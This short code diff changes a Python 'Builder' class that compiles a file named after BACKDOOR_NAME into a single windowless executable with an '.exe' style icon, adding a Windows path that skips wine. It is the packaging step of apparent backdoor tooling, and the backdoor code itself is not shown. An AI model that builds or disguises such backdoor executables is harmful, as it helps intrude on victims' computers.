@@ -43,7 +43,11 @@ class Builder:
         self.compile()
 
     def compile(self):
-        subprocess.call(["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"])
+        compile_command = ["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"]
+        if os.name == 'nt':
+            compile_command[1] = 'venv/Scripts/pyinstaller.exe'
+            compile_command.remove("wine")
+        subprocess.call(compile_command)
         try:
             os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
         except FileNotFoundError:
